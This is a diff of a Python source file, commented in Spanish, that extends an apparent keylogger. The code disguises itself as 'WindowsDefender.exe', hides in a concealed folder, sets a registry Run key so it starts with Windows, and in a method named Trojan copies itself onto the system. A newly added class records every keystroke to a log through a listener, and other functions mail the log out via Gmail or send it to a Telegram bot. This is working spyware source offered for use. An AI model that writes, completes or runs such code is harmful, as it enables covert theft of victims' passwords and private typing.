@@ -30,11 +30,6 @@ import threading                # Hilos
 import socket                   # Librería verifica internet
 #endregion
 
-
-
-
-
-
 class Config:
     def __init__(self):
         self.NAME_KEY = "WindowsDefender"+ ".exe"   # Nombre del Keylogger // Debe ser exactamente igual al Compilado *.exe
@@ -99,6 +94,7 @@ class Functions:
         except:
             print("[Test Internet] => [NO]")
             return False
+
     def SendGmail(self, file, email, password, receiver_email):
         try:
             f = datetime.datetime.now()
@@ -119,11 +115,17 @@ class Functions:
             print("[SendGmail] ["+email+"] No se pudo envíar el Registro de teclas")
             return False
 
+    def RamdomLogNamePATH(self):
+        return Config().LOG_KEY_PATH + Functions().RandomChar(23) + ".txt"
 
+    def CurrentTime(self):
+        T = datetime.datetime.now()
+        return T.strftime("%A") + " " + T.strftime("%d") + " de " + T.strftime("%B") + " " + T.strftime("%I") + ":" + T.strftime("%M") + " " + T.strftime("%p")
 
 class Util:
     def __init__(self): #Constructor?
         pass
+
     def CreateFolders(self):    # Crea el directorio oculto
         try:  # Intenta crear la dirección
             os.makedirs(Config().PATH_OCULT)
@@ -157,6 +159,7 @@ class Util:
             if Functions.CheckFolder_StartUP():
                 registry = OpenKey(HKEY_CURRENT_USER, keyVal, 0, KEY_ALL_ACCESS)  # local
                 SetValueEx(registry, Config().NAME_STARTUP, 0, REG_SZ, Config().PATH_KEY)
+
     def Trojan(self):   # Se Replica en el sistema
         self.CreateFolders()
         try:
@@ -169,11 +172,10 @@ class Util:
                 print("\n[Trojan] - Se replico en el sistema correctamente")
             except:
                 print("\n[Trojan] - Hubo un problema al replicar en el sistema")
-
     # Envía los datos reg.k vía Gmail
     def SendGmail(self):
         # Crea nombre del archivo
-        nameFile = str(getuser()) + "-" + Functions().RandomChar(12) + ".txt"
+        nameFile = Functions().RamdomLogNamePATH()
         # Renombra el archivo original
         self.RenameFileKey(nameFile) # Cambia el archivo `reg.k` a  `user - 234bkhj4b23k4g23vj43.txt`
 
@@ -194,8 +196,8 @@ class Util:
     def TelegramBot(self):
         try:
             print("[TelegramBot] Proceso...")
-            pathN = Config().LOG_KEY_PATH + Functions().RandomChar(23) + ".txt"
-            os.rename(Config().PATH_LOG, pathN)
+            pathN = Functions().RamdomLogNamePATH()
+            os.rename(Config().PATH_LOG, self.NewPathLog)
             # Abre el archivo
             f = open(pathN, 'r')
             T = datetime.datetime.now()
@@ -204,7 +206,7 @@ class Util:
             def SendT(ID):
                 bot = telebot.TeleBot(Config.TelegramBot().TOKEN)  # Instancia
                 bot.send_message(ID,"Usuario: " + str(getuser()) + "\nFecha: " + currentTime + "\n=>\n=>\n" + f.read())
-                print("[TelegramBot] Se obtuvo el registro de teclas y se envió a Telegram [ID 1] =" + str(ID))
+                print("[TelegramBot] Se obtuvo el registro de teclas y se envió a Telegram [ID] =" + str(ID))
             try:
                 if Config.TelegramBot().ID_2 != 000000000:
                     SendT(Config.TelegramBot().ID)
@@ -245,7 +247,7 @@ class Util:
 
         def UpdateUser():
             try:
-                pathN = Config().LOG_KEY_PATH + Functions().RandomChar(23) + ".txt"
+                pathN = Functions().RamdomLogNamePATH()
                 os.rename(Config().PATH_LOG, pathN)
                 # Abre el archivo
                 f = open(pathN, 'r')
@@ -275,14 +277,208 @@ class Util:
                 print("[DataBase] No se encuentra el archivo")
 
         if (exito):  # Solo se ejecutará si se inició correctamente la base de datos
+            print("[DataBase]=> " + str(exito))
             UpdateUser()
-        # print("[DataBase]=> "+str(exito))
 
 
+class Keylogger:
+    def __init__(self):
+        pass
+    # Convierte tecla a un valor legible
+    def KeyConMin(self, numberKey):                # Caracteres Comunes // Optimizados
+        switcher = {
+            # Vocales Minisculas
+            "'a'": "a",
+            "'e'": "e",
+            "'i'": "i",
+            "'o'": "o",
+            "'u'": "u",
+            # Letras  Minusculas
+            "'b'": "b",
+            "'c'": "c",
+            "'d'": "d",
+            "'f'": "f",
+            "'g'": "g",
+            "'h'": "h",
+            "'j'": "j",
+            "'J'": "J",
+            "'k'": "k",
+            "'l'": "l",
+            "'m'": "m",
+            "'n'": "n",
+            "'ñ'": "ñ",
+            "'p'": "p",
+            "'q'": "q",
+            "'r'": "r",
+            "'s'": "s",
+            "'t'": "t",
+            "'v'": "v",
+            "'w'": "w",
+            "'x'": "x",
+            "'y'": "y",
+            "'z'": "z",
+            # Caracteres
+            "','": ",",                     # ,
+            "'.'": ".",                     # .
+            "'_'": "_",                     # _
+            "'-'": "-",                     # -
+            "':'": ":",                     #
+            # Vocales Mayúsculas
+            "'A'": "A",
+            "'E'": "E",
+            "'I'": "I",
+            "'O'": "O",
+            "'U'": "U",
+            # Letras Mayúsculas
+            "'B'": "B",
+            "'C'": "C",
+            "'D'": "D",
+            "'F'": "F",
+            "'G'": "G",
+            "'H'": "H",
+            "'K'": "K",
+            "'L'": "L",
+            "'M'": "M",
+            "'N'": "N",
+            "'Ñ'": "Ñ",
+            "'P'": "P",
+            "'Q'": "Q",
+            "'R'": "R",
+            "'S'": "S",
+            "'T'": "T",
+            "'V'": "V",
+            "'W'": "W",
+            "'X'": "X",
+            "'Y'": "Y",
+            "'Z'": "Z",
+            # Números Standard
+            "'1'": "1",
+            "'2'": "2",
+            "'3'": "3",
+            "'4'": "4",
+            "'5'": "5",
+            "'6'": "6",
+            "'7'": "7",
+            "'8'": "8",
+            "'9'": "9",
+            "'0'": "0",
+            # Caracteres Especiales
+            "'@'": "@",                     # @
+            "'#'": "#",                     # #
+            "'*'": "*",                     # *
+            "'('": "(",                     # (
+            "')'": ")",                     # )
+            '"\'"': "'",                    # '
+            "'\"'": '"',                    # "
+            "'?'": "?",                     # ?
+            "'='": "=",                     # =
+            "'+'": "+",                     # +
+            "'!'": "!",                     # !
+            "'}'": "}",                     # }
+            "'{'": "{",                     # {}
+            "'´'": "´",                     # ´
+            "'|'": "|",                     # |
+            "'°'": "°",                     # °
+            "'^'": "¬",                     # ^
+            "';'": ";",                     #
+            "'$'": "$",                     # $
+            "'%'": "%",                     # %
+            "'&'": "&",                     # &
+            "'>'": ">",                     #
+            "'<'": "<",                     #
+            "'/'": "/",                     # /
+            "'¿'": "¿",                     # ¿
+            "'¡'": "¡",                     # ¡
+            "'~'": "~"                      #
+        }
+        return switcher.get(numberKey, "")
 
+    # Convierte tecla a un valor legible
+    def KeyConMax(self, numberKey):  # Botones, comunes // Optimizados
+        switcher = {
+            "Key.space": " ",  # Espacio
+            "Key.backspace": "«",  # Borrar
+            "Key.enter": "\n",  # Salto de linea
+            "Key.tab": "    ",  # Tabulación
+            "Key.delete": " «×» ",  # Suprimir
+            # Números
+            "<96>": "0",  # 0
+            "<97>": "1",  # 1
+            "<98>": "2",  # 2
+            "<99>": "3",  # 3
+            "<100>": "4",  # 4
+            "<101>": "5",  # 5
+            "<102>": "6",  # 6
+            "<103>": "7",  # 7
+            "<104>": "8",  # 8
+            "<105>": "9",  # 9
+            # Números Númeral
+            "None<96>": "0",  # 0
+            "None<97>": "1",  # 1
+            "None<98>": "2",  # 2
+            "None<99>": "3",  # 3
+            "None<100>": "4",  # 4
+            "None<101>": "5",  # 5
+            "None<102>": "6",  # 6
+            "None<103>": "7",  # 7
+            "None<104>": "8",  # 8
+            "None<105>": "9",  # 9
+            # Teclas raras 2
+            "['^']": "^",
+            "['`']": "`",  #
+            "['¨']": "¨",  #
+            "['´']": "´",  #
+            "<110>": ".",  #
+            "None<110>": ".",  #
+            "Key.alt_l": " [AltL] ",  #
+            "Key.alt_r": " [AltR] ",
+            "Key.shift_r": " [ShiftR] ",
+            "Key.shift": " [ShiftL] ",
+            "Key.ctrl_r": " [CtrlR] ",  #
+            "Key.ctrl_l": " [CtrlL] ",  #
+            "Key.right": " [Right] ",  #
+            "Key.left": " [Left] ",  #
+            "Key.up": " [Up]",  #
+            "Key.down": " [Down] ",  #
+            # "'\x16'"  : " [Pegó] ",
+            # "'\x18'"  : " [Cortar] ",
+            # "'\x03'"  : " [Copiar] ",
+            "Key.caps_lock": " [MayusLock] ",
+            # "Key.media_previous"    : " ♫ ",     #
+            # "Key.media_next"        : " ♫→ ",         #
+            # "Key.media_play_pause"  : " ■ ♫ ■ ",#
+            "Key.cmd": " [W] "  #
+        }
+        return switcher.get(numberKey, "")
 
+    def GetKeys(self):
 
-##print(str());
+        try:  # Intenta crear el archivo
+            log = os.environ.get('pylogger_file', os.path.expanduser(Config().PATH_KEY))
+            with open(log, "a") as f:
+                f.write(
+                    "")  # \n--------------------------------------------\nUserName:   ["+str(getuser()) +"]\n"+ str(getTime)+"--------------------------------------------\n\n")
+        except:  # Si no puede crear el archivo, crea el directorio faltante
+            Util.CreateFolders()  # Function: Crea el directorio Ejemplo: ==> C:\Users\Public\Security\Windows Defender
+
+        def on_press(key):
+            with open(log, "a") as f:
+                # print(str(key)) <= habilitar Solo antiDebug
+                if (len(str(key))) <= 3:
+                    print("Se oprimio la tecla: " + self.KeyConMin(str(key)))
+                    f.write(self.KeyConMin(str(key)))
+                else:
+                    print("Se oprimio la tecla: " + self.KeyConMax(str(key)) )
+                    f.write(self.KeyConMax(str(key)))
+
+        with Listener(on_press=on_press) as listener:  # Escucha pulsaciones de teclas
+            listener.join()
+
+#if __name__ == '__main__':
+
+   # p1 = threading.Thread(target=k)  # Registra teclas
+f = Config()
+print("sdf"+f.Gmail().GMAIL_1)
 
 
 
